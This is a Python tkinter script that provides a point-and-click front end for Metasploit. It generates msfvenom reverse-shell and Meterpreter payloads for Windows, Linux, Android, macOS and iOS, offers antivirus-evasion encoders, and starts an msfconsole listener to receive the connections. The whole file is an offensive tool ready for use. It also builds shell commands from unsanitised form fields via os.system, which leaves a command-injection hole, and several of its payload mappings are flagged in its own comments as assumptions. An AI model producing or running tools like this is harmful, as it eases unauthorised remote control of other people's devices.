import os
import tkinter as tk
from tkinter import ttk, messagebox
from PIL import Image, ImageTk

def generate_payload():
    choice = os_choice.get().split(".")[0]
    payload_type = payload_choice.get().split(".")[0]

    if choice in payloads and payload_type in payloads[choice]:
        payload = payloads[choice][payload_type]
        file_format = file_formats[choice]
    else:
        messagebox.showerror("Error", "Invalid choice")
        return

    lhost = entry_lhost.get()
    lport = entry_lport.get()
    payload_name = entry_payload_name.get()

    if not lhost or not lport or not payload_name:
        messagebox.showerror("Error", "Please enter all the required fields")
        return

    if choice == "3":  # Android case
        file_name = f"{payload_name}.apk"
    else:
        file_name = f"{payload_name}.{file_format}"

    encode_flag = ""
    if encoding_var.get():
        encoding_choice = encoding_type.get().split(".")[0]
        if encoding_choice in encodings:
            encode_flag = f"-e {encodings[encoding_choice]}"
        else:
            messagebox.showerror("Error", "Invalid encoding choice")
            return

    command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {encode_flag} -f {file_format} -o {file_name}"
    show_command(command)
    os.system(command)
    messagebox.showinfo("Success", f"Payload generated: {file_name}")

def start_handler():
    choice = os_choice.get().split(".")[0]
    payload_type = payload_choice.get().split(".")[0]

    if choice in payloads and payload_type in payloads[choice]:
        payload = payloads[choice][payload_type]
        lhost = entry_lhost.get()
        lport = entry_lport.get()

        if not lhost or not lport:
            messagebox.showerror("Error", "Please enter all the required fields")
            return

        command = f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD {payload}; set LHOST={lhost}; set LPORT={lport}; exploit'"
        show_command(command)
        os.system(command)
    else:
        messagebox.showerror("Error", "Invalid choice")

def show_command(command):
    command_window = tk.Toplevel(app)
    command_window.title("Generated Command")
    command_window.geometry("600x200")
    command_window.configure(bg='black')
    ttk.Label(command_window, text="Generated Command:", style="TLabel").pack(pady=10)
    command_text = tk.Text(command_window, wrap=tk.WORD, bg='black', fg='green')
    command_text.insert(tk.END, command)
    command_text.pack(expand=True, fill=tk.BOTH)
    command_text.config(state=tk.DISABLED)

app = tk.Tk()
app.title("Payload Generator")
app.geometry("600x400")
app.configure(bg='black')

# Load and set background image using Pillow
bg_image = Image.open("venom.png")
bg_image = bg_image.resize((600, 400), Image.LANCZOS)
bg_image_tk = ImageTk.PhotoImage(bg_image)
bg_label = tk.Label(app, image=bg_image_tk)
bg_label.place(relwidth=1, relheight=1)

# Define payloads and file formats
payloads = {
    "1": {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "windows/meterpreter/reverse_http",
        "3": "windows/meterpreter/reverse_https",
        "4": "windows/meterpreter_reverse_tcp",
        "5": "windows/meterpreter_reverse_http",
        "6": "windows/meterpreter_reverse_https"
    },
    "2": {
        "1": "linux/x86/meterpreter/reverse_tcp",
        "2": "linux/x86/meterpreter/reverse_http",
        "3": "linux/x86/meterpreter/reverse_https",
        "4": "linux/x86/meterpreter_reverse_tcp",
        "5": "linux/x86/meterpreter_reverse_http",
        "6": "linux/x86/meterpreter_reverse_https"
    },
    "3": {
        "1": "android/meterpreter/reverse_tcp",
        "2": "android/meterpreter/reverse_http",
        "3": "android/meterpreter/reverse_https",
        "4": "android/meterpreter_reverse_tcp",
        "5": "android/meterpreter_reverse_http",
        "6": "android/meterpreter_reverse_https"
    },
    "4": {
        "1": "osx/x86/shell_reverse_tcp",
        "2": "osx/x86/shell_reverse_http",
        "3": "osx/x86/shell_reverse_https",
        "4": "osx/x86/shell_reverse_tcp",  # Assuming this is non-staged for macOS, adjust as needed
        "5": "osx/x86/shell_reverse_http",  # Assuming non-staged reverse HTTP for macOS
        "6": "osx/x86/shell_reverse_https"  # Assuming non-staged reverse HTTPS for macOS
    },
    "5": {
        "1": "ios/meterpreter/reverse_tcp",
        "2": "ios/meterpreter/reverse_http",
        "3": "ios/meterpreter/reverse_https",
        "4": "ios/meterpreter_reverse_tcp",
        "5": "ios/meterpreter_reverse_http",
        "6": "ios/meterpreter_reverse_https"
    }
}

file_formats = {
    "1": "exe",
    "2": "elf",
    "3": "raw",  # Keep file format as raw for Android
    "4": "app",
    "5": "ipa"
}

encodings = {
    "1": "x86/shikata_ga_nai",
    "2": "cmd/powershell_base64",
    "3": "x86/xor_dynamic",
    "4": "x86/call4_dword_xor",
    "5": "x86/unicode_mixed"
}

# GUI Components
style = ttk.Style()
style.configure("TLabel", background='black', foreground='green', font=('Arial', 12, 'bold'))
style.configure("TButton", background='black', foreground='green', font=('Arial', 12, 'bold'))
style.configure("TCombobox", background='black', foreground='green', fieldbackground='black', font=('Arial', 12, 'bold'))
style.configure("TEntry", background='black', foreground='green', fieldbackground='black', font=('Arial', 12, 'bold'))

ttk.Label(app, text="Choose target operating system:").grid(row=0, column=0, sticky=tk.W, pady=2)
os_choice = tk.StringVar()
os_options = ["1. Windows", "2. Linux", "3. Android", "4. macOS", "5. iOS"]
ttk.Combobox(app, textvariable=os_choice, values=os_options, state="readonly").grid(row=0, column=1, pady=2)

ttk.Label(app, text="Choose payload type:").grid(row=1, column=0, sticky=tk.W, pady=2)
payload_choice = tk.StringVar()
payload_options = ["1. Staged Reverse TCP", "2. Staged Reverse HTTP", "3. Staged Reverse HTTPS", 
                   "4. Non-staged Reverse TCP", "5. Non-staged Reverse HTTP", "6. Non-staged Reverse HTTPS"]
ttk.Combobox(app, textvariable=payload_choice, values=payload_options, state="readonly").grid(row=1, column=1, pady=2)

ttk.Label(app, text="LHOST:").grid(row=2, column=0, sticky=tk.W, pady=2)
entry_lhost = ttk.Entry(app)
entry_lhost.grid(row=2, column=1, pady=2)

ttk.Label(app, text="LPORT:").grid(row=3, column=0, sticky=tk.W, pady=2)
entry_lport = ttk.Entry(app)
entry_lport.grid(row=3, column=1, pady=2)

ttk.Label(app, text="Payload Name:").grid(row=4, column=0, sticky=tk.W, pady=2)
entry_payload_name = ttk.Entry(app)
entry_payload_name.grid(row=4, column=1, pady=2)

encoding_var = tk.BooleanVar()
tk.Checkbutton(app, text="Use encoding?", variable=encoding_var, bg='black', fg='green').grid(row=5, column=0, sticky=tk.W, pady=2)

ttk.Label(app, text="Choose encoding type:").grid(row=6, column=0, sticky=tk.W, pady=2)
encoding_type = tk.StringVar()
encoding_options = ["1. x86/shikata_ga_nai", "2. cmd/powershell_base64", "3. x86/xor_dynamic", 
                    "4. x86/call4_dword_xor", "5. x86/unicode_mixed"]
ttk.Combobox(app, textvariable=encoding_type, values=encoding_options, state="readonly").grid(row=6, column=1, pady=2)

ttk.Button(app, text="Generate Payload", command=generate_payload).grid(row=7, column=0, pady=10)
ttk.Button(app, text="Start Handler", command=start_handler).grid(row=7, column=1, pady=10)

app.mainloop()


